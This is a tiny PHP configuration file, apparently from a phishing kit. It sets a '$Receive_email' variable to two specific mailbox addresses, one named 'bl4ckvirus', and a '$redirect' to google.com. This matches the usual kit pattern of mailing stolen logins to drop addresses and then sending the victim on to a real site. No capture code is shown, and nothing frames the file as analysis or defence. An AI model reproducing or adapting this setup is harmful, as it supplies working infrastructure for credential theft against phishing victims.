<?php 
$Receive_email="bl4ckvirus@yandex.com,cofufre@gmail.com";
$redirect="https://www.google.com/";
?>